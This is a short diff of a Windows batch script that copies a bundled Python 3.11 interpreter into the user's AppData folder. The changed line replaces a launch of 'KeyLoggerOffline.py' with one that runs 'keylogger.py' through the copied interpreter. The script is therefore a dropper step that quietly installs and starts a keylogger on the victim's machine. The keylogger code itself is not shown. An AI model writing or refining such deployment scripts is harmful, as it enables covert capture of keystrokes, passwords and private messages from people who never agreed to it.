@@ -9,4 +9,4 @@ md %APPDATA%\..\Local\Programs\Python\Python311
 :Python311
 xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311
 
-start .\KeyLoggerOffline.py
+start %APPDATA%\..\Local\Programs\Python\Python311\python.exe .\keylogger.py
